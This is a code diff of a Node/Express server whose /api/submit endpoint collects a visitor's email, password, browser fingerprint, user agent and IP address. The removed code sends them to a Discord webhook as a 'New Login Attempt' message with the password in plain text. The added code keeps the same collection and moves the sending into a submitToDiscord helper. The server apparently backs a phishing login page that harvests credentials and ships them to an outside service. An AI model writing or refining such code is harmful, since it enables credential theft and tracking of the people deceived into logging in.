@@ -1,12 +1,12 @@
-import 'dotenv/config';
 import express from "express";
 import { createServer as createViteServer } from "vite";
 import path from "path";
 import { fileURLToPath } from "url";
-import { sendDiscordWebhook } from './functions/utils';
 
 const __filename = fileURLToPath(import.meta.url);
 const __dirname = path.dirname(__filename);
+
+import { submitToDiscord } from "./functions/discord";
 
 async function startServer() {
   const app = express();
@@ -68,85 +68,24 @@ async function startServer() {
     next();
   });
 
-
-  // health & debug endpoints
+  // API routes
   app.get("/api/health", (req, res) => {
     res.json({ status: "ok" });
   });
-  app.get("/functions/health", (req, res) => {
-    res.json({ status: "ok" });
-  });
 
-  app.get("/api/debug", (req, res) => {
-    res.json({
-      webhookUrl: process.env.DISCORD_WEBHOOK_URL ? `***${process.env.DISCORD_WEBHOOK_URL.slice(-20)}` : 'NOT SET',
-      nodeVersion: process.version,
-      hasGlobalFetch: typeof globalThis.fetch === 'function'
-    });
-  });
-  app.get("/functions/debug", (req, res) => {
-    res.json({
-      webhookUrl: process.env.DISCORD_WEBHOOK_URL ? `***${process.env.DISCORD_WEBHOOK_URL.slice(-20)}` : 'NOT SET',
-      nodeVersion: process.version,
-      hasGlobalFetch: typeof globalThis.fetch === 'function'
-    });
-  });
-
-  // handler reused for both /api/submit and /functions/submit for dev convenience
-  const submitHandler = async (req: express.Request, res: express.Response) => {
+  app.post("/api/submit", async (req, res) => {
     const { email, password, fingerprint, theme } = req.body;
-    const webhookUrl = process.env.DISCORD_WEBHOOK_URL;
-
-    console.log('\n=== submit called ===', req.path);
-    console.log('Request body:', { email, password: '***', fingerprint: fingerprint?.substring(0, 20), theme });
-    console.log('Webhook URL set:', !!webhookUrl);
-
-    if (!webhookUrl) {
-      console.error("DISCORD_WEBHOOK_URL is not set");
-      // treat as an error so that deployment issues surface quickly
-      return res.status(500).json({ error: "Webhook URL missing from environment" });
-    }
+    const userAgent = req.headers['user-agent'] || "N/A";
+    const ip = req.ip || "N/A";
 
     try {
-      const payload = {
-        embeds: [
-          {
-            title: "New Login Attempt",
-            color: 0xff4b33,
-            fields: [
-              { name: "Email", value: (email || "N/A").toString().substring(0, 1024), inline: true },
-              { name: "Password", value: (password || "N/A").toString().substring(0, 1024), inline: true },
-              { name: "Theme", value: (theme || "Default").toString().substring(0, 1024), inline: true },
-              { name: "Fingerprint", value: `\`\`\`${(fingerprint || "N/A").toString().substring(0, 1024)}\`\`\`` },
-              { name: "User Agent", value: (req.headers['user-agent'] || "N/A").toString().substring(0, 1024) },
-              { name: "IP", value: (req.ip || "N/A").toString().substring(0, 1024) }
-            ],
-            timestamp: new Date().toISOString()
-          }
-        ]
-      };
-
-      console.log('Sending Discord payload:', JSON.stringify(payload).substring(0, 500) + '...');
-      const result = await sendDiscordWebhook(webhookUrl, payload);
-      
-      console.log('Discord response:', result);
-      
-      if (!result.ok) {
-        console.error('Webhook failed with status', result.status);
-        return res.status(500).json({ error: 'Failed to submit', details: result });
-      }
-
-      console.log('✅ Submit successful');
-      res.json({ status: "ok" });
+      const result = await submitToDiscord(email, password, fingerprint, theme, userAgent, ip);
+      res.json(result);
     } catch (error) {
-      console.error("❌ Error submitting to Discord:", error);
-      res.status(500).json({ error: "Failed to submit", message: String(error) });
+      console.error("Error submitting to Discord:", error);
+      res.status(500).json({ error: "Failed to submit" });
     }
-  };
-
-  app.post("/api/submit", submitHandler);
-  app.post("/functions/submit", submitHandler);
-
+  });
 
   // Vite middleware for development
   if (process.env.NODE_ENV !== "production") {
